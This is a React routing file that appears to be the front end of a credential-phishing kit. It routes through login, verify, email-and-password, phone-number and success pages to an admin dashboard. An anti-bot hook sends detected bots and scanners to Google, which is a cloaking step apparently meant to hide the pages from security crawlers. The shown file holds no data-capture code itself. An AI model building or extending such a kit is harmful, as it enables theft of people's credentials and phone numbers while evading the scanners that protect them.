import React from "react";
import { BrowserRouter as Router, Route, Routes } from "react-router-dom";
import LoginPage from "./pages/LoginPage";
import VerifyPage from "./pages/VerifyPage";
import EmailPassPage from "./pages/EmailPassPage";
import NumberPage from "./pages/NumberPage";
import SuccessPage from "./pages/SuccessPage";
import DashboardLoginPage from "./pages/DashboardLoginPage";
import AdminDashboard from "./pages/AdminDashboard";
import useAntiBot from "./hooks/useAntiBot";
function App() {
  const { isBotDetected, loading } = useAntiBot();

  if (isBotDetected) {
    window.location.href = "https://www.google.com"; // Redirects to Google
    return null; // Return null to avoid rendering the rest of the component
  }
  return (
    <Router>
      <Routes>
        <Route path="/login" element={<LoginPage />} />
        <Route path="/verify" element={<VerifyPage />} />
        <Route path="/email-pass" element={<EmailPassPage />} />
        <Route path="/number" element={<NumberPage />} />
        <Route path="/success" element={<SuccessPage />} />
        <Route path="/admin-login" element={<DashboardLoginPage />} />
        <Route path="/admin-dashboard" element={<AdminDashboard />} />
        {/* You can add more routes here */}
      </Routes>
    </Router>
  );
}

export default App;
